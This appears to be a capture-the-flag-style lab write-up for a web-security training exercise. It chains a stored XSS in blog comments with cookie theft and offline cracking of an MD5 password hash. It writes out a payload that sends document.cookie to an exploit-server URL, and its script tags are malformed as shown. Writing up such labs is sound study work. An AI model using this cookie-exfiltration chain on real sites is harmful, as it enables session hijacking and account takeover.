# Offline Password Cracking
- The lab is vulnerable to 2 vulnerabilities
   1. Cookie can be bruteforced
   2. Comments has XSS vulnerability
- First we need to exploit the XSS vulnerability, and then we can do the same steps from [Brute Force Stay logged in Token Lab](../Brute-forcing%20a%20stay-logged-in%20cookie/Brute-forcing%20a%20stay-logged-in%20cookie.md)  

1. Login with wiener
2. Go to Home
3. press view post
4. in the comment insert a test XSS script
   1. (<script alert(1) </script)
5. Fill the remaining values, and submit a comment, then go back to the comment page, you should find alert appeared.
6. This confirm the existance of XSS vulnerability. 
7. Now we can use the server provided to get the cookies of any user
8. in the comment insert this payload instead:
   1. script> document.location="https://exploit-0ab100c6046836e480520277013c000d.exploit-server.net/exploit" +document.cookie </script
9. and send it via repeater so you need to URL encode it first. 
10. Then go to the server page, and go to the logs page.
11. You will find Carlos stay logged in cookie.
12. Take it, and decode it, and extract the md5hash of the password.
13. Go to Crackstation, and crack it, then use the retrieved password to log in.